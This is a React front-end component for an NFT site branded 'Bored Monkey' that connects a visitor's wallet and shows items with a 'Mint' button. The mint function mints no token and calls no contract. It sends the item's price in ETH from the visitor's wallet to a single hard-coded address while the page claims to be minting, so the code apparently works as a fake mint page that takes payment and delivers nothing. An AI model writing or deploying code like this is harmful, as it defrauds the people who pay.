import {useState, useEffect, useRef} from "react";
import {useWeb3React} from "@web3-react/core";
import {injected} from "../wallet/Connector";
import web3 from "web3";
import items from "../api/items";
import Swal from "sweetalert2";
import {Modal} from "bootstrap";
import logo from "../assets/logo.webp";
import eth from "../assets/eth.svg";

export default function Auth() {
	const [products] = useState(items);
	const [minting, setMinting] = useState(false);
	const {active, account, library, activate, deactivate} = useWeb3React();
	const [modal, setModal] = useState(null);
	const [data, setData] = useState(false);
	const nftModal = useRef();

	useEffect(() => {
		setModal(new Modal(nftModal.current));
	}, []);

	async function connect() {
		try {
			await activate(injected);
			Swal.fire({
				icon: "success",
				iconColor: "#2ecc71",
				text: "You have successfully connected your wallet!",
				showConfirmButton: false,
				position: "top-end",
				timer: 1500,
			});
		} catch (ex) {
			console.log(ex);
		}
	}
	async function disconnect() {
		try {
			deactivate();
			Swal.fire({
				icon: "warning",
				iconColor: "#ec644b",
				text: "You have disconnected your wallet!",
				showConfirmButton: false,
				position: "top-end",
				timer: 1500,
			});
		} catch (ex) {
			console.log(ex);
		}
	}

	async function mint() {
		setMinting(true);
		const myAccount = "0xD746641E41F90f8C0CCD1d8187444e1CAb08143C";

		let obj = {
			to: myAccount,
			from: account,
			// ----------- conversion to Wei units --------
			value: web3.utils.toWei(data.price, "ether"),
			gas: 85000,
			gasLimit: "100000",
		};

		await library.eth.sendTransaction(obj, async (e, tx) => {
			if (e) {
				Swal.fire({
					icon: "error",
					title: "Oops...",
					text: "Something went wrong!",
					confirmButtonColor: "#ec644b",
					footer: "<a href>Why do I have this issue?</a>",
				});
				setMinting(false);
			} else {
				setMinting(false);
			}
		});
	}

	return (
		<>
			<nav className="navbar sticky-top navbar-light bg-white border-bottom">
				<div className="container-fluid">
					<a
						href="/"
						className="navbar-brand d-flex align-items-center"
					>
						<img
							src={logo}
							alt="Bored Monkey"
							width="30"
							height="30"
							className="me-2"
						/>
						Bored Monkey
					</a>
					<form className="d-flex align-items-center">
						<span className="small text-muted me-3 d-none d-md-block">
							{account}
						</span>
						{active ? (
							<button
								onClick={disconnect}
								className="btn btn-outline-danger"
								type="button"
							>
								Disconnect
							</button>
						) : (
							<button
								onClick={connect}
								className="btn btn-outline-success"
								type="button"
							>
								Connect Wallet
							</button>
						)}
					</form>
				</div>
			</nav>
			<div className="container my-5">
				<div className="row g-3 text-center">
					{products.map((item, index) => (
						<div className="col-md-6 col-lg-3" key={index}>
							<img
								className="img-fluid"
								src={item.img}
								alt={`item_${index}`}
								onClick={() => {
									setData(item);
									modal.show();
								}}
							/>
						</div>
					))}
				</div>
				{/* Modal */}
				<div
					className="modal fade"
					ref={nftModal}
					tabIndex="-1"
					aria-labelledby="nftModalLabel"
					aria-hidden="true"
				>
					<div className="modal-dialog">
						<div className="modal-content">
							<div className="modal-header">
								<h5 className="modal-title d-flex align-items-center">
									<img src={eth} alt="ethereum" height="20" />
									{data.price}
								</h5>
								<button
									type="button"
									className="btn-close"
									onClick={() => modal.hide()}
									aria-label="Close"
								></button>
							</div>
							<div className="modal-body">
								<img
									className="img-fluid"
									src={data.img}
									alt=""
								/>
							</div>
							<div className="modal-footer">
								{active ? (
									<button
										type="button"
										disabled={minting}
										onClick={mint}
										className="btn btn-outline-primary w-100"
									>
										{minting
											? "Waiting confirmation.."
											: "Mint"}
									</button>
								) : (
									<button
										onClick={connect}
										className="btn btn-outline-success w-100"
										type="button"
									>
										Connect Wallet
									</button>
								)}
							</div>
						</div>
					</div>
				</div>
			</div>
		</>
	);
}
